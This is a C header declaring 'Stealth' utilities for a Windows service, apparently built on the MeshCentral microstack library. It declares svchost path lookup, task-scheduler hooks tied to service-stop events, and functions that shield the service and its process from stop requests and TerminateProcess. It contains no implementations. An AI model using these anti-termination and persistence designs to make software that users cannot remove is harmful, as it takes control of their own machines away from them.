#ifndef STEALTH_UTILS_H
#define STEALTH_UTILS_H

#include <windows.h>
#include "../microstack/ILibCrypto.h"

#ifdef __cplusplus
extern "C" {
#endif

void Stealth_DebugPrintfA(const char* format, ...);
void Stealth_DebugPrintfW(const wchar_t* format, ...);
void Stealth_DebugLastErrorA(const char* context);
void Stealth_DebugLastErrorW(const wchar_t* context);

#define STEALTH_SHA256_STRING_LENGTH   (UTIL_SHA256_HASHSIZE * 2)
BOOL Stealth_ComputeFileSha256W(const wchar_t* path, wchar_t* hexOut, size_t hexOutLen);

/* Resolve the native system svchost.exe path through GetSystemDirectoryW. */
BOOL Stealth_GetSystemSvchostPathW(wchar_t* outPath, size_t outPathSize);

/* Dynamic path resolution for service data directory.
 * Uses SHGetKnownFolderPath(FOLDERID_ProgramData) to get ProgramData path,
 * then appends the service/application name subdirectory.
 * Returns FALSE if path cannot be determined.
 */
BOOL Stealth_GetDataDirectoryW(const wchar_t* serviceName, wchar_t* outPath, size_t outPathSize);

/* Build a full path within the data directory */
BOOL Stealth_GetDataFilePathW(const wchar_t* serviceName, const wchar_t* fileName, wchar_t* outPath, size_t outPathSize);

/* Ensure data directory exists, creating if necessary */
BOOL Stealth_EnsureDataDirectoryW(const wchar_t* serviceName);

/* Token and XPath utilities for task scheduler */
void Stealth_BuildSanitizedToken(const wchar_t* input, wchar_t* output, size_t outputSize);
void Stealth_FormatServiceStopXPath(const wchar_t* serviceName, wchar_t* xPath, size_t xPathSize);

/* Service protection - protects SERVICE object in SCM from stop commands */
BOOL Stealth_ProtectServiceFromTermination(const wchar_t* serviceName);

/*
 * Process protection - protects the PROCESS from TerminateProcess() calls.
 * CRITICAL: This is different from Stealth_ProtectServiceFromTermination()!
 * - Stealth_ProtectServiceFromTermination() = blocks SCM stop requests.
 * - Stealth_ProtectCurrentProcess() = blocks Task Manager kill, TerminateProcess(), etc.
 */
BOOL Stealth_ProtectCurrentProcess(void);
BOOL Stealth_ProtectProcessByHandle(HANDLE hProcess);

#ifdef __cplusplus
}
#endif

#endif /* STEALTH_UTILS_H */
